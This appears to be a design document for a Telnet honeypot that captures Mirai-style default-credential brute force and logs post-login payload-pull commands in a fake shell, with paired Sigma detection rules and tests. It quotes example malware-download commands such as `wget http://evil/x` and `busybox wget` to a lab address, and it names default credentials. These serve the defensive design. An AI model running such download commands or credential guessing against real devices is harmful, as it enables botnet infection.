<!-- SPDX-License-Identifier: GPL-3.0-or-later -->
# Design: Telnet honeypot (IoT/Mirai) + `telnet-bruteforce` / `telnet-payload-pull` detections

**Date:** 2026-07-01
**Status:** Approved (pre-implementation)
**Backlog item:** new service emulator (additive) — Telnet

## Summary

Add a plaintext Telnet service (port 23, service #15) that captures the classic
IoT/Mirai attack pattern: default-credential brute-force, then a fake shell that
logs post-login commands (busybox/wget/tftp payload-pull) while executing and
fetching NOTHING. It **mirrors the shipped SSH honeypot's model** and **reuses
`src/lyrebird/services/ssh_shell.py::respond()`** — the pure, protocol-agnostic
command emulator — so only the transport (plaintext line protocol with Telnet
IAC handling) and the telemetry tags are new. Two paired Sigma rules ship with
it. **No new dependency** (stdlib `asyncio`; Telnet is plaintext, unlike SSH).

## Goals

- A believable Telnet endpoint that captures brute-force credentials and, after
  a threshold / weak-credential match, post-login commands + payload-pull URLs.
- Reuse `ssh_shell.respond()` for command emulation (DRY) — only add the Telnet
  transport and Telnet-specific telemetry.
- Emit `credentials` (context), `telnet-bruteforce` and `telnet-payload-pull`
  (signals), each paired with a Sigma rule.

## Non-goals (YAGNI)

- No TLS; no real command execution / filesystem / network egress (the emulator
  is pure — payload URLs are logged, never fetched).
- No Telnet option *negotiation* — incoming IAC control bytes are only STRIPPED;
  the server sends plain-text prompts (enough for Mirai/busybox clients).
- No model-backed responses. No changes to the SSH service, its tags, or rules.
- No public-key / no encryption (Telnet is plaintext by definition).

## Current state

There is no Telnet service. `ssh_shell.respond(command) -> (output, pull|None)`
is a pure function (imports only `re`/`shlex`; no I/O) already used by the SSH
honeypot to produce canned recon output and recognise `wget`/`curl`/`tftp`/
`busybox` payload-pull commands — it is reused as-is here. `credentials` is an
existing **context** tag (imap/pop3/ftp/smtp/ssh), declared in
`tests/test_detection_pairing.py`. The SSH honeypot (`services/ssh.py`) is the
structural model: capture per-attempt credentials, accept on weak-cred/threshold,
then a fake shell emitting per-command events + a payload-pull signal.

## Architecture

Single new service file `src/lyrebird/services/telnet.py`.

### `TelnetService(BaseService)`

- `start()` → `asyncio.start_server(self._handle, host=bind_address, port=cfg.port)`;
  `stop()` closes it (same pattern as ftp/imap).
- `_handle(reader, writer)`: per-connection flow —
  1. Write the configured `banner`.
  2. **Login loop:** write `login: ` → read a line (username); write `Password: `
     → read a line (password). Each password submission is one attempt: emit a
     `credentials` event `{user, password, method:"telnet", accepted}`. Accept if
     `(user,password)` matches a `weak_creds` entry OR `attempts >= accept_after`;
     else write `\r\nLogin incorrect\r\n` and loop back to `login: `.
  3. On accept: if `attempts >= bruteforce_threshold`, emit one `telnet-bruteforce`
     event `{attempts, client, accepted:true}`; then enter the fake shell.
  4. **Fake shell:** write a prompt (e.g. `# `); read commands line-by-line; for
     each, call `respond(cmd)`, write the canned output, and emit a per-command
     `request` event (`{command}`, no tag) — or, when `respond` returns a
     payload-pull, `tags=["telnet-payload-pull"]` with `{command, tool, url}`.
     Break on `exit`/`logout`/`quit` or EOF; re-prompt after each command.
- Registered UNCONDITIONALLY in `orchestrator.REGISTRY` (stdlib, no import risk).

### Telnet IAC handling

`_strip_iac(data: bytes) -> bytes` (module-level pure helper) removes Telnet
control sequences so credentials/commands are captured cleanly:

- `IAC IAC` (0xFF 0xFF) → a literal 0xFF byte.
- `IAC WILL|WONT|DO|DONT <opt>` (0xFF, 0xFB–0xFE, opt) → dropped (3 bytes).
- `IAC SB … IAC SE` subnegotiation → dropped.
- other `IAC <cmd>` (2 bytes) → dropped.

Reading a line = read until `\n`, `_strip_iac`, then `.strip()` of CR/LF/NUL.
The server sends no negotiation of its own (plain-text prompts).

### Reused command emulator

`from .ssh_shell import respond`. No change to `ssh_shell.py`. The Telnet service
decides the tags (`telnet-payload-pull`); `respond` supplies the output + pull.

## Scope guardrail (non-negotiable — per SCOPE.md)

The fake shell logs intent and performs nothing: `respond` is pure (no exec, no
filesystem, no socket), so a `wget http://evil/x` is parsed for its URL and
answered with canned output — never fetched. Asserted by a test.

## Telemetry

Tags emitted: `credentials` (existing context), `telnet-bruteforce` (new signal),
`telnet-payload-pull` (new signal). Ordinary captured commands carry no tag.

- Per auth attempt — `event_type="auth"`, `tags=["credentials"]`,
  `request={"user","password","method":"telnet","accepted":bool}`.
- Per connection (brute-force) — once when `attempts >= bruteforce_threshold`:
  `event_type="request"`, `tags=["telnet-bruteforce"]`,
  `request={"attempts":int,"client":str,"accepted":bool}` (`client` = peer ip:port
  string, since Telnet has no client-version banner).
- Per shell command — `event_type="request"`, `request={"command":str}` (no tag);
  a payload-pull adds `tags=["telnet-payload-pull"]`, `request={"command","tool","url"}`.

## Detections (paired)

Two new rules under `detections/sigma/`, `logsource: product: lyrebird, service:
telnet`, `condition: selection`:

1. `telnet_bruteforce.yml` — `selection: {service:'telnet', tags|contains:'telnet-bruteforce'}`;
   `fields: src_ip, request.attempts, request.accepted, request.client`;
   `level: medium`; FPs: legit admins/scanners using Telnet outside a single-sample lab.
2. `telnet_payload_pull.yml` — `selection: {service:'telnet', tags|contains:'telnet-payload-pull'}`;
   `fields: src_ip, request.tool, request.url, request.command`;
   `level: high`; FPs: an admin fetching a file via a Telnet shell.

`telnet-bruteforce`/`telnet-payload-pull` are **signals** (paired) and must NOT be
added to `CONTEXT_OR_ANALYTIC_TAGS`. `credentials` already declared context.

## Config

`DEFAULTS["services"]["telnet"]` in `src/lyrebird/config.py`:

```python
"telnet": {"enabled": True, "port": 23,
           "banner": "\r\nAM335x/Linux login service\r\n",
           "accept_after": 3, "weak_creds": [], "bruteforce_threshold": 3},
```

- `accept_after` guarantees the shell phase is reachable; `weak_creds` optional
  accept-on-match; `bruteforce_threshold` when the signal fires. (Same semantics
  as the SSH honeypot.)

## Error handling / edge cases

- The `_handle` body is exception-guarded and closes the writer in `finally`
  (matches ftp/imap); a dropped connection mid-login/shell must not escape.
- Login `readline` uses a timeout (e.g. 60s) so an idle connection is bounded.
- A client that connects and immediately closes yields no `credentials` event.
- `_strip_iac` is defensive against truncated IAC sequences at a buffer edge.

## Testing

New `tests/test_telnet_service.py` (one event loop via `asyncio.open_connection`
against the control channel; poll-for-artifact on the JSONL log):

- **Brute-force → deny → accept:** `accept_after=3`; send 3 user/pass pairs;
  assert 3 `credentials` events (last `accepted:true`), acceptance on the 3rd,
  and one `telnet-bruteforce` with `attempts:3`.
- **Weak-cred accept:** `weak_creds=[{user:"root",password:"root"}]`; `root/root`
  accepted on attempt 1; no `telnet-bruteforce`.
- **Shell capture + payload-pull:** after accept, send `busybox wget http://10.0.0.9/m`;
  assert canned output, a command event, and a `telnet-payload-pull` with
  `tool:"wget"`, `url:"http://10.0.0.9/m"`, and that nothing was fetched.
- **IAC stripping:** send a username wrapped in IAC bytes
  (`\xff\xfd\x01root\r\n` — IAC DO ECHO + "root") and assert the captured user is
  `"root"` (control bytes stripped), plus a direct `_strip_iac` unit assertion.
- Registry/instantiation covered by the phase-3 services test (extend if it
  enumerates services).
- Regenerate `REFERENCE.md`; run the full suite + `scripts/lint_sigma.py`.

## Acceptance criteria

- `telnet` registered in `orchestrator.REGISTRY`, configurable, emits structured
  events; reuses `ssh_shell.respond` (no change to `ssh_shell.py`).
- Brute-force captured as `credentials` per attempt + one `telnet-bruteforce`
  signal per qualifying connection; fake shell emits `telnet-payload-pull` for
  fetch commands — fetching nothing; IAC control bytes stripped from capture.
- `telnet_bruteforce.yml` + `telnet_payload_pull.yml` exist, lint clean, pair the
  signals; pairing guard green without touching `CONTEXT_OR_ANALYTIC_TAGS`.
- README Services row (15 services); `REFERENCE.md` regenerated; full suite green;
  SPDX headers on new files; commits DCO-signed + `Co-Authored-By` trailer.
- **No dependency change** (stdlib only — `requirements.txt`/`pyproject.toml`
  untouched).

## Files touched

- `src/lyrebird/services/telnet.py` (new)
- `src/lyrebird/orchestrator.py` (register `TelnetService`)
- `src/lyrebird/config.py` (telnet defaults)
- `detections/sigma/telnet_bruteforce.yml`, `telnet_payload_pull.yml` (new, paired)
- `tests/test_telnet_service.py` (new)
- `README.md` (Services row + count → 15), `REFERENCE.md` (regenerated)
